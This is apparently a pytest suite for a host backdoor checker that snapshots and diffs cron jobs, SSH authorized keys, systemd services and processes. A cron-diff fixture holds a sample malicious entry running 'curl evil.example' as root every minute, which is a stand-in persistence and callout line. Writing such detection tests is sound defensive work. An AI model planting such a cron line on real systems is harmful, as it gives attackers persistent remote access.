#!/usr/bin/env python3
"""Tests for host_control_plane/backdoor_check.py (v3.12)."""

import os
import sys
import tempfile
import shutil

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "host_control_plane"))

from backdoor_check import BackdoorCheck, BackdoorSnapshot  # noqa: E402


@pytest.fixture
def sandbox():
    d = tempfile.mkdtemp(prefix="exonerve_backdoor_")
    cron_d = os.path.join(d, "cron.d")
    spool = os.path.join(d, "spool")
    wants = os.path.join(d, "wants")
    for p in (cron_d, spool, wants):
        os.makedirs(p)
    yield {"root": d, "cron_d": cron_d, "spool": spool, "wants": wants}
    shutil.rmtree(d, ignore_errors=True)


def _check(sandbox):
    return BackdoorCheck(cron_dirs=[sandbox["cron_d"]],
                         cron_spool_dir=sandbox["spool"],
                         systemd_wants_dir=sandbox["wants"])


class TestSnapshotting:
    def test_snapshot_with_no_findings_anywhere_is_clean_but_valid(self, sandbox):
        bc = _check(sandbox)
        snap = bc.snapshot()
        assert snap.cron_entries == {}
        assert snap.startup_services == []
        assert isinstance(snap.timestamp, str) and snap.timestamp

    def test_missing_directories_do_not_crash(self):
        bc = BackdoorCheck(cron_dirs=["/nonexistent/path"],
                           cron_spool_dir="/nonexistent/spool",
                           systemd_wants_dir="/nonexistent/wants")
        snap = bc.snapshot()   # must not raise
        assert snap.cron_entries == {}
        assert snap.startup_services == []

    def test_cron_entry_is_captured(self, sandbox):
        cron_file = os.path.join(sandbox["cron_d"], "backup")
        with open(cron_file, "w") as f:
            f.write("# comment, should be ignored\n")
            f.write("0 2 * * * root /usr/local/bin/backup.sh\n")
        bc = _check(sandbox)
        snap = bc.snapshot()
        assert cron_file in snap.cron_entries
        assert "0 2 * * * root /usr/local/bin/backup.sh" in snap.cron_entries[cron_file]

    def test_startup_service_is_captured(self, sandbox):
        open(os.path.join(sandbox["wants"], "nginx.service"), "w").close()
        open(os.path.join(sandbox["wants"], "not-a-service.txt"), "w").close()
        bc = _check(sandbox)
        snap = bc.snapshot()
        assert snap.startup_services == ["nginx.service"]

    def test_running_processes_snapshot_is_nonempty_on_a_live_system(self, sandbox):
        bc = _check(sandbox)
        snap = bc.snapshot()
        assert len(snap.running_processes) > 0   # this test process itself, at minimum

    def test_snapshot_round_trips_through_dict(self, sandbox):
        bc = _check(sandbox)
        snap = bc.snapshot()
        restored = BackdoorSnapshot.from_dict(snap.to_dict())
        assert restored.to_dict() == snap.to_dict()


class TestDiffing:
    """Diff is pure logic over constructed snapshots — no filesystem
    dependency needed to test the actual comparison behaviour."""

    def _snap(self, **overrides):
        base = {"timestamp": "t0", "ssh_keys": {}, "cron_entries": {},
               "startup_services": [], "running_processes": []}
        base.update(overrides)
        return BackdoorSnapshot(**base)

    def test_new_ssh_key_is_flagged_as_added(self):
        before = self._snap(ssh_keys={"/root/.ssh/authorized_keys": ["keyA"]})
        after = self._snap(ssh_keys={"/root/.ssh/authorized_keys": ["keyA", "keyB"]})
        findings = BackdoorCheck().diff(before, after)
        added = [f for f in findings if f["category"] == "ssh_authorized_key"
                and f["change"] == "added"]
        assert len(added) == 1
        assert "keyB" in added[0]["entries"]
        assert "keyA" not in added[0]["entries"]   # only the NEW key, not the whole set

    def test_removed_ssh_key_is_flagged_as_removed(self):
        before = self._snap(ssh_keys={"/root/.ssh/authorized_keys": ["keyA", "keyB"]})
        after = self._snap(ssh_keys={"/root/.ssh/authorized_keys": ["keyA"]})
        findings = BackdoorCheck().diff(before, after)
        removed = [f for f in findings if f["change"] == "removed"]
        assert len(removed) == 1 and "keyB" in removed[0]["entries"]

    def test_identical_snapshots_produce_no_findings(self):
        snap = self._snap(ssh_keys={"/root/.ssh/authorized_keys": ["keyA"]},
                         cron_entries={"/etc/crontab": ["* * * * * root ls"]},
                         startup_services=["nginx.service"],
                         running_processes=["1:init:/sbin/init"])
        findings = BackdoorCheck().diff(snap, snap)
        assert findings == []

    def test_new_cron_entry_is_flagged(self):
        before = self._snap()
        after = self._snap(cron_entries={"/etc/cron.d/new": ["* * * * * root curl evil.example"]})
        findings = BackdoorCheck().diff(before, after)
        assert any(f["category"] == "cron_entry" and f["change"] == "added" for f in findings)

    def test_new_startup_service_is_flagged(self):
        before = self._snap(startup_services=["nginx.service"])
        after = self._snap(startup_services=["nginx.service", "backdoor.service"])
        findings = BackdoorCheck().diff(before, after)
        svc = [f for f in findings if f["category"] == "startup_service"]
        assert len(svc) == 1 and "backdoor.service" in svc[0]["entries"]

    def test_diff_never_returns_a_verdict_only_findings(self):
        """Structural check on the API contract itself: diff() must return
        a list of findings, never a bool/verdict — the playbook stage this
        feeds requires a human to review findings and decide, not an
        automatic pass/fail from this function."""
        result = BackdoorCheck().diff(self._snap(), self._snap())
        assert isinstance(result, list)
